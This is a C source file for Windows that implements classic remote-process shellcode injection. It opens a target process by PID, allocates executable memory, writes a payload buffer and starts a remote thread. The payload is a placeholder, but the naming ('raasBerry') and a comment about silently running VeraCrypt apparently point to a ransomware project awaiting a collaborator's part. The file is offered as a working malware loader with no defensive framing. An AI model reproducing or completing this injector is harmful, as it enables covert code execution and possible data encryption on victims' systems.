#include <windows.h> // Developing for windows on linux, not a problem.
#include <stdio.h>
#include <stdlib.h>

// Technique to inject a shellcode into a process.
//macros

const char* k = "[+]";
const char* e = "[-]";
const char* i = "[*]";

DWORD PID, TID = NULL; 
HANDLE hProcess = NULL;
HANDLE hThread = NULL;
LPVOID rBuffer = NULL;

// shellcode
unsigned char raasBerry[] = "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x90"; // shellcode for executing veracrypt software as background process
// awaiting almydr's part.

int main(int argc, char* argv[]) {
// Get a handle on a process by attaching to, or creating one
    
    if (argc < 2) {


        return EXIT_FAILURE;
    }

    //PID = atoi(argv[1]);
    char *endptr;
    PID = strtol(argv[1], &endptr, 10);
    if (*endptr != '\0') {
        return EXIT_FAILURE;// Handle the error: argv[1] is not a valid integer
    } 
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID );//open handle to process pid
    printf("%s got a handle to the process!\n\\---0x%p\n", k, hProcess);  // comment me

    if (hProcess == NULL) {
        printf("%s couldn't get a handle to the process (%ld), error: %ld", e, PID, GetLastError());  // comment me
        return EXIT_FAILURE;
    };

// Allocate a buffer in the process memory with the necessary permissions

    rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(raasBerry), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE); 
    printf("%s allcoated %zu-bytes with rwx permissions\n", k, sizeof(raasBerry)); // comment me

// Write the contents of the shellcode to that buffer in the process memory
    
    WriteProcessMemory(hProcess, rBuffer, raasBerry, sizeof(raasBerry), NULL );
    printf("%s wrote %zu-bytes to process memory\n", k, sizeof(raasBerry)); // comment me

// Create a thread that will run in allocated memory and written into the process
    hThread = CreateRemoteThreadEx(
        hProcess,
        NULL,
        0, //stack size
        (LPTHREAD_START_ROUTINE)rBuffer,
        NULL, 
        0,  // run thread immediately
        0,
        &TID);

    if (hThread == NULL){
        printf("%s failed to get a handle to the thread, error: %ld", e, GetLastError());
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    };

    WaitForSingleObject(hThread, INFINITE); //sounds like trouble waiting to happen ;)

    // cleaning
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return EXIT_SUCCESS;

}
